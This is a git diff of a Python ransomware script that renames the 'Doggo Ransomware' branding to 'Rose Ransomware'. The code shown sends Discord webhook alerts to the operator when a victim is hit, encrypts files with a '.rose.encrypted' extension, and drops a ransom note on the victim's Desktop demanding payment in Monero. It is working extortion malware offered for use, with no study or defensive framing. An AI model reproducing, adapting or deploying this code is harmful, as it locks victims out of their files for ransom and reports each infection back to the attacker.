@@ -19,13 +19,13 @@ timestamp = datetime.datetime.now().isoformat()
 
 def log_error(e):
     data = {
-        "username": "Doggo Ransomware",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1148300902051090625/1148326216663842824/doggo.jpg",
+        "username": "Rose Ransomware",
+        "avatar_url": "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/Rose.png",
         "embeds": [
             {
-                "title": "Doggo Ransomware Error",
-                "url": "https://github.com/gumbobr0t",
-                "color": 0xFF3030,
+                "title": "Rose Ransomware Error",
+                "url": "https://github.com/voyqge",
+                "color": cc.get_color(),
                 "fields": [
                     {
                         "name": "USER ID",
@@ -39,7 +39,7 @@ def log_error(e):
                     }
                 ],
                 "footer": {
-                    "text": "https://github.com/gumbobr0t"
+                    "text": "https://github.com/voyqge"
                 },
                 "timestamp": timestamp
             }
@@ -63,7 +63,7 @@ ransom_note = f"""Your computer is now infected with ransomware. Your file are e
 
 To recover your files you need a key. This key is generated once your file have been encrypted. To obtain the key, you must purchase it.
 
-You can do this by sending ${cash} USD to this monero address:
+You can do this by sending {cash} USD to this monero address:
 {monero_adr}
 
 Don't know how to get monero? Here are some websites:
@@ -89,14 +89,14 @@ Good luck"""
 
 def send_wh():
     data = {
-        "username": "Doggo Ransomware",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1148300902051090625/1148326216663842824/doggo.jpg",
+        "username": "Rose Ransomware",
+        "avatar_url": "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/Rose.png",
         "embeds": [
             {
-                "title": "Doggo Ransomware Hit",
-                "description": "Hello. It looks like you have hit another person. As soon as they send you an email with their personal ID and you approved their payment, please send them the download link for the decryption tool and give them their key, thanks.",
-                "url": "https://github.com/gumbobr0t",
-                "color": 0x00FF00,
+                "title": "Rose Ransomware Hit",
+                "description": "Hello. It looks like you have hit another person. As soon as they send you an email with their personal ID and you approved their payment, please send them the download link for the decryption tool and give them their key, thanks. https://github.com/DamagingRose/Rose-Grabber/tree/main/resources/utils/rosedec",
+                "url": "https://github.com/voyqge",
+                "color": cc.get_color(),
                 "fields": [
                     {
                         "name": "USER ID",
@@ -115,7 +115,7 @@ def send_wh():
                     }
                 ],
                 "footer": {
-                    "text": "https://github.com/gumbobr0t"
+                    "text": "https://github.com/voyqge"
                 },
                 "timestamp": timestamp
             }
@@ -134,7 +134,7 @@ def encrypt_file(file_path):
         file_data = file.read()
         encrypted_data = cipher_suite.encrypt(file_data)
 
-    encrypted_file_path = file_path + '.doggo.encrypted'
+    encrypted_file_path = file_path + '.rose.encrypted'
     with open(encrypted_file_path, 'wb') as encrypted_file:
         encrypted_file.write(encrypted_data)
 
@@ -158,7 +158,7 @@ def encrypt_directory(directory_path):
 
 def encrypted_files():
     try:
-        with open('DOGGO-RANSOMWARE-ENCRYPTED-FILES.txt', 'w') as file:
+        with open('ROSE-RANSOMWARE-ENCRYPTED-FILES.txt', 'w') as file:
             for encryptedfile in encryptedfiles:
                 file.write(encryptedfile + '\n')
     except Exception as e:
@@ -169,11 +169,10 @@ def ransomware():
     send_wh()
     encrypt_directory(target_directory)
     encrypted_files()
-    del cipher_suite
 
     try:
         desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-        file_path = os.path.join(desktop, 'DOGGO-RANSOMWARE-NOTE.txt')
+        file_path = os.path.join(desktop, 'ROSE-RANSOMWARE-NOTE.txt')
         with open(file_path, 'w') as f:
             f.write(ransom_note)
 
